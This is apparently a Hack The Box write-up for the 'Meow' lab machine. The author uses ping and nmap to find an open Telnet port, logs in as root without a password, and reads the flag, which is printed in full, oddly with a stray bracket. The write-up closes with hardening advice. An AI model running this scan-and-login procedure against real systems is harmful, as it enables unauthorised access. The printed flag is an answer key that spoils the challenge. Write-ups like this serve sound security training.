# HTB — Meow

<img width="1100" height="592" alt="image" src="https://github.com/user-attachments/assets/1114e484-88ab-4d80-9aa0-41819fe3355e" />

## Introduction

Meow is an easy-level machine on Hack The Box. The machine demonstrates a very simple but important security issue: **unauthenticated access to a Telnet service with the `root` account**.

---

## 1. Initial Connectivity Test

I started by verifying that the target was reachable from my Kali machine using ICMP.

```bash
ping 10.129.111.125
```

The target responded to all four ICMP requests with **0% packet loss**, confirming that the host was reachable and ready for further enumeration. 

<img width="642" height="247" alt="image" src="https://github.com/user-attachments/assets/5c040a7a-f8f2-453d-aa70-de1ff7ae57cc" />

---

## 2. Port and Service Enumeration

After confirming connectivity, I performed an Nmap scan to identify the services exposed by the target.

```bash
nmap -A 10.129.111.125
```

The scan revealed a single open TCP port:

```text
23/tcp open  telnet
```

Nmap identified the service as **Telnet** and provided additional information indicating that the target was running Linux and appeared to be a MikroTik RouterOS-based system. 

The discovery of Telnet was particularly interesting because Telnet is an insecure remote-access protocol and should generally not be exposed to untrusted networks.

<img width="992" height="396" alt="image" src="https://github.com/user-attachments/assets/fcec440e-c601-4fa1-b837-d072e51bc181" />

---

## 3. Connecting to the Telnet Service

Since port 23 was open, I attempted to connect to the service using the Telnet client.

```bash
telnet 10.129.111.125
```

The connection was successful and presented a login prompt:

```text
Meow login:
```

At this point, I needed to determine whether the service accepted weak or default credentials. 

I attempted to authenticate using the `root` account.

```text
Meow login: root
```

The login was accepted without requiring a password, and I was immediately provided with a root shell:

```text
root@Meow:~#
```

This confirmed that the machine was vulnerable to **unauthenticated root access through Telnet**. 

<img width="449" height="544" alt="image" src="https://github.com/user-attachments/assets/ad2a6db8-e3e4-42e2-929b-5743862d05c9" />

---

## 4. Retrieving the Flag

Once I obtained a root shell, I listed the contents of the current directory:

```bash
ls
```

The directory contained:

```text
flag.txt
snap
```

I then read the contents of `flag.txt`:

```bash
cat flag.txt
```

The flag was successfully retrieved:

```text
b40abdf[e23665f766f9c61ecba8a4c19
```

The successful retrieval confirmed full compromise of the machine. 

<img width="631" height="135" alt="image" src="https://github.com/user-attachments/assets/78172719-adaa-4f51-b87e-cc1a038f3e86" />

---

## 5. Attack Path

The complete attack path was straightforward:

```text
Host Discovery
      ↓
Nmap Enumeration
      ↓
Telnet — Port 23
      ↓
Unauthenticated Root Login
      ↓
Root Shell
      ↓
Read flag.txt
      ↓
Machine Compromised
```

---

## Conclusion

The compromise of **Meow** was possible because the Telnet service allowed direct access to the **root account without authentication**.

The key security issues were:

* Telnet exposed on port 23
* No effective authentication
* Direct access to the `root` account
* Full system access available to an unauthenticated user

From a defensive perspective, Telnet should be disabled whenever possible and replaced with **SSH**. Remote administrative accounts should also require strong authentication, and direct remote access to the root account should be restricted.

